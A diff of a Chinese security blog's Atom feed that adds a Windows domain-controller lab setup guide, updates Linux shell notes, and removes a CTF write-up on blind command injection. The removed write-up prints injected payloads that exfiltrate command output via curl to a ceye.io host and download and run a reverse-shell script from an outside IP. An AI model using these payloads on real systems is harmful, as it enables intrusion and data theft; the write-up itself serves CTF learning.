@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.daikersec.com/"/>
-  <updated>2018-06-24T14:54:16.846Z</updated>
+  <updated>2018-07-01T14:43:35.926Z</updated>
   <id>http://www.daikersec.com/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>域控环境搭建</title>
+    <link href="http://www.daikersec.com/wiki/d0aab67c.html"/>
+    <id>http://www.daikersec.com/wiki/d0aab67c.html</id>
+    <published>2018-07-01T14:41:59.000Z</published>
+    <updated>2018-07-01T14:43:35.926Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-主机"><a href="#0x00-主机" class="headerlink" title="0x00 主机"></a>0x00 主机</h2><p> DC: win2008<br>DM: win7<br>先留意下win0228当前主机的账号<br><img src="https://upload-images.jianshu.io/upload_images/5443560-98fa836dbd3f9f94.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h2 id="0x01-添加角色"><a href="#0x01-添加角色" class="headerlink" title="0x01 添加角色"></a>0x01 添加角色</h2><p>打开服务器管理<br>添加角色<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a9e805529b17003f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>勾选“Active Directory域服务”，然后等待安装<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a367c165408de660.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h2 id="0x02-配置域服务"><a href="#0x02-配置域服务" class="headerlink" title="0x02 配置域服务"></a>0x02 配置域服务</h2><p>运行里面输入<code>dcpromo.exe</code><br>注意下这里<br><img src="https://upload-images.jianshu.io/upload_images/5443560-dea27ff34db61e5c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>接下来设置林根域： 林就是在多域情 况下形成的森林,根表示基础<br>一些概念性的域林和域树和跟域的概念</p><ul><li>1.域林是由一个或多个没有形成连续名字空间的域树组成。它与域树最明显的区别在于构成域林的域树之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域所组成的。</li><li><ol start="2"><li>域林中的所有域树仍共享同一个表结构、配置和全局目录，所有域树通过Kerberos信任关系建立，所以每个域树都知道Kerberos信任关系，<code>不同域树可以交叉引用其他域树中的对象</code>。域林都有<code>根域</code>，这是域林中创建的<code>第一个域</code>，域林中所有域树的根域与域林的根域建立<code>可传递</code>的信任关系。</li></ol></li><li>3.域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。树中的域通过信任关系连接起来，“活动目录”包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次。如域“child.Microsoft.com”就比“Microsoft.com”这个域级别低，因为前者有两个层次关系，而后者只有一个层次。</li><li><ol start="4"><li>域树中的域是通过<code>双向可传递信任关系</code>连接在一起的，因此在域树或树林中新创建的域可以立即与域树或树林中每个其他的域建立信任关系。这些信任关系允许单一的登录过程，在域树或树林中的所有域上对用户进行身份验证，但这不一定意味着经过身份验证的用户在域树的所有域中都拥有相同的权利和权限</li></ol></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/5443560-c666506e8c254fd8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>由于原来没有域林。我们选择在新林中建立新建域。即这个域为根域<br>出现这个的话<br><img src="https://upload-images.jianshu.io/upload_images/5443560-5d6af192477fc1c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>按提示改就好<br>接下来<br><img src="https://upload-images.jianshu.io/upload_images/5443560-46947185bbec4fc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>设置为DNS服务器<br><img src="https://upload-images.jianshu.io/upload_images/5443560-458bc8dcf41884b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>一些文件位置<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c5f19f0c3c22d667.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>可以看到自动把dns改成本机<br><img src="https://upload-images.jianshu.io/upload_images/5443560-140eeda7af0d03ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后查看账号，可以发现多了个<code>krbtgt</code>,他就是ad的Kerberos 服务账号<br><img src="https://upload-images.jianshu.io/upload_images/5443560-1296dab119a51271.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h2 id="0x03-加入域控"><a href="#0x03-加入域控" class="headerlink" title="0x03 加入域控"></a>0x03 加入域控</h2><p>先改下dns<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a4af56296254298e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后加入域<br><img src="https://upload-images.jianshu.io/upload_images/5443560-16d69a0c0047961d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>输入域管理员账号和密码，等待加域成功，重启后生效。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;0x00-主机&quot;&gt;&lt;a href=&quot;#0x00-主机&quot; class=&quot;headerlink&quot; title=&quot;0x00 主机&quot;&gt;&lt;/a&gt;0x00 主机&lt;/h2&gt;&lt;p&gt; DC: win2008&lt;br&gt;DM: win7&lt;br&gt;先留意下win0228当前主机的账号&lt;br&gt;
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="windows安全" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/windows%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="域渗透" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/windows%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="渗透测试" scheme="http://www.daikersec.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="windows" scheme="http://www.daikersec.com/tags/windows/"/>
+    
+  </entry>
   
   <entry>
     <title>调度任务</title>
@@ -130,7 +161,7 @@
     <link href="http://www.daikersec.com/wiki/fb0a66e4.html"/>
     <id>http://www.daikersec.com/wiki/fb0a66e4.html</id>
     <published>2018-06-24T14:10:56.000Z</published>
-    <updated>2018-06-24T14:53:32.243Z</updated>
+    <updated>2018-06-24T15:05:47.217Z</updated>
     
     <content type="html"><![CDATA[<h4 id="1-shell变量赋值"><a href="#1-shell变量赋值" class="headerlink" title="1. shell变量赋值"></a>1. shell变量赋值</h4><ul><li>任何字符串都可以作为变量的值赋给某个变量； </li><li>如果字符串中包含空格、tab或换行符时，应该用 引号（单、双都可以）括起来。</li><li>变量的值中包含多个连续的空格在输出显示时会当 作一个空格来处理</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-4E87I7L:/tmp# a=5</span><br></pre></td></tr></table></figure><h4 id="2-变量引用"><a href="#2-变量引用" class="headerlink" title="2. 变量引用"></a>2. 变量引用</h4><p><code>$</code>+变量名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-4E87I7L:/tmp# echo $a</span><br><span class="line">5</span><br></pre></td></tr></table></figure></p><h4 id="3-系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）"><a href="#3-系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）" class="headerlink" title="3. 系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）"></a>3. 系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）</h4><ul><li>PATH 是操作系统用于查找来自命令行或终端窗口的必需可执行文件的系统变量。<br>比如执行<code>cat 1.txt</code>。这个cat 是在<code>/usr/bin/cat</code>这个路径，但是当前可以找到它，是因为<code>PATH</code>这个变量里面有<code>/usr/bin</code>这个</li><li><p>HOME 家目录<br>正常的话,root用户的家目录在  <code>/root</code>,其他用户在<code>/home/用户名</code></p></li><li><p>PS1<br>提示符<br>如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-4E87I7L:/tmp# echo $PS1</span><br><span class="line">\[\e]0;\u@\h: \w\a\]$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$</span><br></pre></td></tr></table></figure></li></ul><p>其中一些特殊字符的代码<br>\$ 显示$符作为提示符，如果用户是root的话，则 显示#号。<br>\\ 显示反斜杠。<br>\d 显示当前日期。<br>\h 显示主机名。<br>\t 显示当前时间。<br>\w 显示当前工作目录的路径。 </p><ul><li>PS2<br>PS2 变量展开的方式与 PS1 相同，其展开值用作次提示符字符串。用于提示接续你尚未完成输入的命令。默认为<code>&gt;</code><br>比如<br><img src="https://upload-images.jianshu.io/upload_images/5443560-e4162d4da46ba5f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>稍作修改。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-9f5890c8316b646a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li><li>PWD<br>当前路径,作用跟<code>pwd</code>一样</li><li>环境文件（profile和bashrc的差别）<br>profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当<code>用户登录</code>时,该文件仅仅执行一次!<br>bashrc:该文件包含专用于你的bash shell的bash信息,当<code>登录时</code>以及 <code>每次打开新的shell</code>时,该文件被读取.</li></ul><h4 id="4-shell通配符"><a href="#4-shell通配符" class="headerlink" title="4. shell通配符"></a>4. shell通配符</h4><p>用来匹配多个文件名或目录名的特殊字符叫通配 符。<br>*   匹配任意个（含0个）字符<br>?   匹配任意一个字符<br>[list] 匹配其中之一的字符<br>[!list]   匹配不在其中的字符</p><p>如<code>1*3.txt</code>匹配1223.txt<br>如<code>1?3.txt</code>匹配123.txt<br>如<code>[abcd]1.txt</code>匹配a1.txt<br>如<code>[a-d]1.txt</code>匹配a1.txt<br>如<code>[!abc]1.txt</code>匹配d1.txt</p><h4 id="5-引号"><a href="#5-引号" class="headerlink" title="5. 引号"></a>5. 引号</h4><p><img src="https://upload-images.jianshu.io/upload_images/5443560-0b00669a4de56c6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>双引号会解析</p><h4 id="6-正则表达式"><a href="#6-正则表达式" class="headerlink" title="6. 正则表达式"></a>6. 正则表达式</h4><p>跟通配符的区别<br>正则表达式和shell的特殊字符异同点<br>正则表达用点匹配任意一个字符，相当于shell的问号。<br>.*匹配零或多个字符，相当于shell的*<br> []用法和shell一样，只是用^代替了!表示不匹配<br><img src="https://upload-images.jianshu.io/upload_images/5443560-fe35539e4f2f2d49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-c6e0242eceb1752d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-9d54af6b41fa6656.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="7-输入输出命令"><a href="#7-输入输出命令" class="headerlink" title="7. 输入输出命令"></a>7. 输入输出命令</h4><p>标准输入输出<br>每一个Linux命令都有３个与之相关的输入输出流： </p><ul><li>stdin     标准输入，命令默认的输入位置 </li><li>stdout   标准输出，命令默认的输出位置 </li><li>stderr    标准错误输出，也是命令的输出位置，用于输出错误及诊断信息。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-5ea97dc03087fe69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><code>重定向</code><br>比如把应该输出到屏幕的输出到文件<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8187538ecfb73c0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li></ul><p><code>2&gt;&amp;1</code>解释<br>2 是标准错误，1是标准输出，就是把标准错误发送到标准输出。注意1要加个<code>&amp;</code>，不然就会重定向到文件1</p><p><code>cat 1.txt &gt;/dev/null</code>解析<br>这里的<code>/dev/null</code>是黑洞。把输出的重定向到黑洞。等同于不输出</p><h4 id="8-管道"><a href="#8-管道" class="headerlink" title="8. 管道"></a>8. 管道</h4><p>命令A | 命令B<br>这个就是管道，把命令A 的内容的标准输出流当成命令B的标准输入流，<img src="https://upload-images.jianshu.io/upload_images/5443560-29846072489f7b92.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>举个例子<br><img src="https://upload-images.jianshu.io/upload_images/5443560-1024f4680905f91b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>cat 1的结果<code>123</code>传递给<code>grep 2</code></p><h4 id="9-shell脚本"><a href="#9-shell脚本" class="headerlink" title="9. shell脚本"></a>9. shell脚本</h4><p>变量读取<br>判断<br>循环<br>$# 参数个数<br>$0 文件名<br>$1 第一个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">read -p &quot;please input yes or not: &quot; yn</span><br><span class="line">echo $yn</span><br><span class="line">if [ &quot;$&#123;yn&#125;&quot;==&quot;Y&quot; -o &quot;$&#123;yn&#125;&quot;==&quot;y&quot; ]; then</span><br><span class="line">echo &quot;OK, continue&quot;</span><br><span class="line">exit 0</span><br><span class="line">elif [ &quot;$&#123;yn&#125;&quot;==&quot;Y&quot; -o  &quot;$&#123;yn&#125;&quot;==&quot;y&quot; ]; then</span><br><span class="line">echo &quot;oh,NO&quot;</span><br><span class="line">exit 0</span><br><span class="line">else</span><br><span class="line">echo &quot;please input yes or not&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $# == 1 ]:</span><br><span class="line">echo &quot;请添加参数&quot;</span><br><span class="line">exit 0</span><br><span class="line">fi</span><br><span class="line">echo &quot;Filename: &quot;$0</span><br><span class="line">i=0</span><br><span class="line">while [ &quot;$&#123;i&#125;&quot; != $1 ]</span><br><span class="line">do</span><br><span class="line">i=$(($i+1))</span><br><span class="line">echo $i</span><br><span class="line">done</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -293,7 +324,7 @@
     <link href="http://www.daikersec.com/wiki/fb27c52e.html"/>
     <id>http://www.daikersec.com/wiki/fb27c52e.html</id>
     <published>2018-06-24T14:09:05.000Z</published>
-    <updated>2018-06-24T14:59:44.624Z</updated>
+    <updated>2018-06-24T15:05:15.115Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-说明"><a href="#0x00-说明" class="headerlink" title="0x00 说明"></a>0x00 说明</h2><h2 id="0x01-内容要点"><a href="#0x01-内容要点" class="headerlink" title="0x01 内容要点"></a>0x01 内容要点</h2><p>1、自由软件、GPL规则<br>2、shell的版本、虚拟控制台的切换、文件命名规则、绝对路径和相对路径<br>3、硬连接和软连接（符号连接）、UID和GID、文件属性、修改文件权限、备份和压缩工具<br>4、vi（教案第3章P21中红色标注的命令）<br>5、文本安装模式进入到shell的方式、硬盘及分区代号、分区划分原则<br>6、inittab文件的作用（关键字不用记）、系统初始化流程、启动脚本程序的设置<br>7、远程X的设置<br>8、shell变量赋值、变量引用、系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）、shell通配符、引号、正则表达式、输入输出命令、管道、shell脚本<br>9、RPM的安装、卸载、升级、查询、验证<br>10、用户管理<br>11、PID、PPID、EUID、EGID，监视进程、管理进程、信号发送的命令kill<br>12、文件和目录的访问控制、粘滞位<br>13、crontab的配置 </p><h2 id="0x02-目录"><a href="#0x02-目录" class="headerlink" title="0x02 目录"></a>0x02 目录</h2><ul><li><a href="https://www.jianshu.com/p/ffe81766c479" target="_blank" rel="noopener">0 Linux 简介</a></li><li><a href="https://www.jianshu.com/p/c7f74a0947a3" target="_blank" rel="noopener">1 Linux 基础</a></li><li><a href="https://www.jianshu.com/p/05c2095031ac" target="_blank" rel="noopener">2 Linux 安装和启动</a></li><li><a href="wiki/4f7c637d">3 Linux GUI和文本编辑</a></li><li><a href="https://www.jianshu.com/p/815fae7a9708" target="_blank" rel="noopener">4 Linux 软件管理</a></li><li><a href="https://www.jianshu.com/p/369ee974efc8" target="_blank" rel="noopener">5 Linux shell和shell编程</a></li><li><a href="https://www.jianshu.com/p/fd15facc74b5" target="_blank" rel="noopener">6 Linux 用户管理</a></li><li><a href="https://www.jianshu.com/p/19a2531ec53d" target="_blank" rel="noopener">7 Linux 进程管理</a></li><li><a href="https://www.jianshu.com/p/4bdae02d4278" target="_blank" rel="noopener">8 Linux 权限管理</a></li><li><a href="https://www.jianshu.com/p/0218cea0a72e" target="_blank" rel="noopener">9 Linux 调度任务</a></li></ul>]]></content>
     
@@ -551,37 +582,6 @@
       <category term="注入" scheme="http://www.daikersec.com/tags/%E6%B3%A8%E5%85%A5/"/>
     
       <category term="web" scheme="http://www.daikersec.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>happyMoctf-ping一下好吗WP</title>
-    <link href="http://www.daikersec.com/wiki/8f0228b2.html"/>
-    <id>http://www.daikersec.com/wiki/8f0228b2.html</id>
-    <published>2018-02-15T10:39:15.000Z</published>
-    <updated>2018-05-21T03:03:47.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过<code>DNS通道/HTTP通道</code>和<code>反弹shell</code>。</p><h1 id="0x01-DNS通道-HTTP通道"><a href="#0x01-DNS通道-HTTP通道" class="headerlink" title="0x01 DNS通道/HTTP通道"></a>0x01 DNS通道/HTTP通道</h1><p>post ip=0.0.0.0|curl ***.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><a id="more"></a><br>执行<code>ls|base64</code>(要经过base64编码是因为有一些不可打印字符和空格)解码后可以看到<br><img src="http://upload-images.jianshu.io/upload_images/5443560-1e0c7759a04a3ad3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png">。<br>然后cat就可以读flag。这里面出了个小差错，<code>&lt;?php</code>后面忘记加空格，导致直接访问查看源码可以直接看到flag。说个好玩的，我13号早上把flag文件名的名字改了，然后晚上查看日志的时候居然发现几个ip在直接访问旧的flag文件名。<br><img src="http://upload-images.jianshu.io/upload_images/5443560-0d402cd5889e2bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>dns类似，直接post `command`.xx.ceye.io就可以</p><h1 id="0x02-反弹shell"><a href="#0x02-反弹shell" class="headerlink" title="0x02 反弹shell"></a>0x02 反弹shell</h1><p>由于直接反弹shell的命令几乎都会触发waf，所以可以先把执行shell的命令保存到本地，再执行。这里面不存在wget，只能利用curl。<code>-</code>被禁了，不能通过-o来保存到文件，可以通过<code>&gt;</code>。写到/tmp底下执行<br>post ip=0.0.0.0|curl 139.199.2.226:6666/1 &gt;/tmp/1<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c8eecae75ecda861.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后本机监听8080端口<br><img src="http://upload-images.jianshu.io/upload_images/5443560-bb7e6e0b6aaebf0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>post ip=0.0.0.0|/chmod +x tmp/1<br>添加执行权限<br>post ip=0.0.0.0|/tmp/1<br>反弹成功<br><img src="http://upload-images.jianshu.io/upload_images/5443560-798bfb8dbf456659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过&lt;code&gt;DNS通道/HTTP通道&lt;/code&gt;和&lt;code&gt;反弹shell&lt;/code&gt;。&lt;/p&gt;
-&lt;h1 id=&quot;0x01-DNS通道-HTTP通道&quot;&gt;&lt;a href=&quot;#0x01-DNS通道-HTTP通道&quot; class=&quot;headerlink&quot; title=&quot;0x01 DNS通道/HTTP通道&quot;&gt;&lt;/a&gt;0x01 DNS通道/HTTP通道&lt;/h1&gt;&lt;p&gt;post ip=0.0.0.0|curl ***.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)&lt;br&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;图片.png&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web安全" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="命令执行" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    
-      <category term="ctf" scheme="http://www.daikersec.com/tags/ctf/"/>
-    
-      <category term="Web" scheme="http://www.daikersec.com/tags/Web/"/>
-    
-      <category term="漏洞研究" scheme="http://www.daikersec.com/tags/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
     
   </entry>
   
